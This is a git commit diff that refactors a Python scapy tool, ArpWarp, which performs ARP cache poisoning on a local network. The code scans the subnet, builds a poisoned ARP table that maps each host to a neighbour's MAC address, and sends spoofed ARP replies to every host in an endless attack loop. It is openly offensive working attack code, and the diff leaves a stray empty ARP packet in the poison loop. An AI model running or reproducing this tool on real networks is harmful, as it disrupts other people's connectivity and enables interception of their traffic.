f5519b950b3f482fa165737038e40f6f77b8814d
adanikel@gmail.com <adanikel@gmail.com>
2022-08-12 11:20:52 +0300

    rename to arper

--- arpwarp.py
+++ arpwarp.py
@@ -1,8 +1,9 @@
-import threading
-import time
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
 
-from scapy.layers.l2 import ARP, Ether
 from scapy.all import *
+from typing import Dict, Union
+conf.verb = 0
 
 #   --------------------------------------------------------------------------------------------------------------------
 #
@@ -18,9 +19,9 @@ from scapy.all import *
 
 
 class ArpWarp:
-    def __init__(self, cycle_len, do_restore, iface):
-        self.cycle_length = int(cycle_len)
-        self.do_restore = int(do_restore)
+    _P_TIMEOUT = 2
+
+    def __init__(self, iface):
         self.network_interface = iface
 
         self.my_mac = Ether().src
@@ -34,28 +35,28 @@ class ArpWarp:
         self.original_arp_cache = self.generate_original_cache()
         self.poisoned_arp_cache = self.generate_poisoned_cache()
 
-        self.finished = False
+        self.abort = False
 
-    def get_original_arp(self, tested_ip):
-        arp_packet = ARP(op=1, psrc=self.my_private_ip, hwsrc=self.my_mac, pdst=tested_ip)
-        arp_res = srp1(Ether() / arp_packet, timeout=2, iface=self.network_interface)
-        return arp_res
-
-    def generate_original_cache(self):
+    def generate_original_cache(self) -> Dict[str, str]:
         print(f"[*] Generating original ARP table for subnet {'.'.join(self.subnet)}.x")
         arp_cache = dict()
 
         for host_p in self.subnet_range:
             t_ip = ".".join(self.subnet + [str(host_p)])
             if t_ip != self.my_private_ip:
-                res = self.get_original_arp(t_ip)
+                res = self.send_arp_packet(iface=self.network_interface,
+                                           op=1,
+                                           psrc=self.my_private_ip,
+                                           hwsrc=self.my_mac,
+                                           pdst=t_ip,
+                                           await_res=True)
                 if res:
                     print(f"[+] HOST IS UP {t_ip} -> {res[ARP].hwsrc}")
                     arp_cache[t_ip] = res[ARP].hwsrc
         print(f"[*] Finished generating original ARP table...")
         return arp_cache
 
-    def generate_poisoned_cache(self):
+    def generate_poisoned_cache(self) -> Dict[str, str]:
         """
         Make a new poisoned table where each key has the value of the preceeding key
         """
@@ -82,11 +83,13 @@ class ArpWarp:
 
             for target_host_ip, target_host_mac in self.original_arp_cache.items():
                 if target_host_ip != poison_host_ip:
-                    arp_packet = ARP(op=2,
-                                     psrc=poison_host_ip,
-                                     hwsrc=poison_host_mac,
-                                     pdst=target_host_ip,
-                                     hwdst=target_host_mac)
+                    self.send_arp_packet(iface=self.network_interface,
+                                         op=2,
+                                         psrc=poison_host_ip,
+                                         hwsrc=poison_host_mac,
+                                         pdst=target_host_ip,
+                                         hwdst=target_host_mac)
+                    arp_packet = ARP()
                     sendp(Ether() / arp_packet, iface=self.network_interface)
 
     def restore_arp(self):
@@ -98,36 +101,44 @@ class ArpWarp:
 
             for target_host_ip, target_host_mac in self.original_arp_cache.items():
                 if target_host_ip != restore_host_ip:
-                    arp_packet = ARP(op=2,
-                                     psrc=restore_host_ip,
-                                     hwsrc=restore_host_mac,
-                                     pdst=target_host_ip,
-                                     hwdst=target_host_mac)
-                    sendp(Ether() / arp_packet, iface=self.network_interface)
+                    self.send_arp_packet(iface=self.network_interface,
+                                         op=2,
+                                         psrc=restore_host_ip,
+                                         hwsrc=restore_host_mac,
+                                         pdst=target_host_ip,
+                                         hwdst=target_host_mac)
 
-    def do_attack(self):
-        try:
-            loop_count = 0
-            while loop_count < self.cycle_length:
+    def start_attack(self):
+        loop_count = 0
+        while not self.abort:
+            try:
                 loop_count += 1
                 self.poison_arp()
-                print(f"[*] Finished attack loop {loop_count} out of {self.cycle_length}")
+                print(f"[*] Finished attack loop -> {loop_count}")
                 time.sleep(self.arp_poison_interval)
-        except Exception as exc:
-            print(f"[!] Exception caught: {exc}")
-        finally:
-            if self.do_restore:
-                print("[*] Restoring arp...")
-                self.restore_arp()
+            except Exception as exc:
+                print(f"[!] Exception caught -> {exc}")
+                self.abort = True
+            except KeyboardInterrupt:
+                print(f"[*] User requested to stop...")
+                self.abort = True
+        print("[*] Restoring arp...")
+        self.restore_arp()
+
+    @staticmethod
+    def send_arp_packet(iface, await_res=False, **p_params) -> Union[None, scapy.layers.l2.Ether]:
+        arp_packet = ARP(**p_params)
+        if await_res:
+            arp_res = srp1(Ether() / arp_packet, timeout=ArpWarp._P_TIMEOUT, iface=iface)
+            return arp_res
+        sendp(Ether() / arp_packet, iface=iface)
 
 
 if __name__ == "__main__":
     conf.verb = 0
 
-    cycle_length = sys.argv[1]
-    restore_after_cycle = sys.argv[2]
-    network_interface = sys.argv[3]
+    network_interface = "gif0"
     while True:
         print(f"[*] Setting up a new attacker...")
-        shuffler = ArpShuffler(cycle_length, restore_after_cycle, network_interface)
-        shuffler.do_attack()
+        warper = ArpWarp(network_interface)
+        warper.start_attack()
